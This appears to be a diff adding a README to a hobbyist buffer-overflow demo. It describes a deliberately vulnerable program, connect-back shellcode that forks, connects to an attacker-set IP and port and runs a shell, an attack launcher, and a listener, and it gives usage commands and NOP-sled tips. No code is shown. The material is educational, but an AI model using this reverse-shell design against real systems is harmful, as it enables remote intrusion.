@@ -1,0 +1,80 @@
+
+hello boys, I'm Gildo [mmeneghin@inwind.it]
+this little code is an example of how is possible
+to write an exploit suitable for a vulnerability
+of another program ;-)
+I have inserted this code inside my Dama game, but perhaps
+that one is boring, so look this littler piece.
+
+files are:
+  
+  vulnerable.c	is the vulnerable program that run on the victim host,
+		vulnerable send the address of the buffer to overflow, lol!
+		this is a really stupid thing perhaps, becouse usually
+		exploiting common services you can only suppose the address
+		where to jump, I made so becouse I don't care,
+		althought you can easily send formatted exploit string
+		with supposed addresses until you find the right one,
+		or better you can insert at the beginning some nop (0x90)
+		that will save you if you fall in that gap.
+  --------------
+  exploit.s	is the exploit written in AT&T, sorry if you don't like,
+		is executed inside a buffer of vulnerable, 
+		so on the remote host, and do simply this:
+	-fork() and parent exit so vulnerable don't stay in a suspened state 
+	-create socket and initialize a struct sockaddr_in, with the
+		IP and PORT of my prompttelnet program (see later)
+	-connect to prompttelnet program
+	-redirect the stdin to a socket sock_in, and stdout and stderr to
+		sock_out. Note that I used close and fcntl(really I used 
+		dup2 in another exploit and it's better, eheh
+		I don't want to rewrite without a reason)
+	-execve a shell, so you'll be happy	
+  --------------
+  attack.c	is the program that attacks the vulnerable, this means that
+		do two things:
+	-ask the address of buffer to overflow
+	-send a formatted exploiting string to vulnerable that is
+		the exploit code that I over told, but differs in
+		some parameters as: *IP where is running prompttelnet
+		                    *PORT where is tunning prompttelnet
+				    *ADDRESS of buffer to overflow in memory
+				    *some padding bytes
+  --------------
+prompttelnet.s	is the program that interface the shell executed on the remote
+		host, so you'l type commands here and they will be executed 
+		on the remote host.
+		start prompttelnet where you want, typically on the same 
+		machine where you start attack
+		
+		
+=========================
+HOW MAKE I WORK ALL THIS?
+
+first start the vulnerable program or make it start from someone else (remotelly),
+second start the prompttelnet program (locally if you want)
+third start the attack in this way:
+  attack <IP of vulnerable> <PORT of vulnerable> <IP of promptelnet> <PORT of prompttelnet>
+
+NOTE_1:
+    you can start all 3 programs on the same computer, but you cannot have a 0
+    in <IP of prompttelnet> and <PORT of prompttelnet>
+NOTE_2:
+    you can try the exploit directly without attack, just running:
+    -prompttelnet
+    -exploit
+    on the same computer, it'll use default IP=127.0.0.1 and PORT 18002 18003
+NOTE_3:
+    I'm sure you'll like to write exploits, I'll give you the file
+    dump that is a perl script that I use to grap opcodes with comments in asm
+    into C files
+NOTE_4:
+    I wrote this code only becouse I was curious of seeing how work these things,
+    but I know I wrote a very lame thing, and this is only a demo that
+    gives some ideas, not the end purpouse of something at all,
+    sure you'll try more advanced things, tell me about them if you want
+    
+bye, becouse sizeof(README) is becoming bigger of sizeof(code) ;-)
+
+          
+
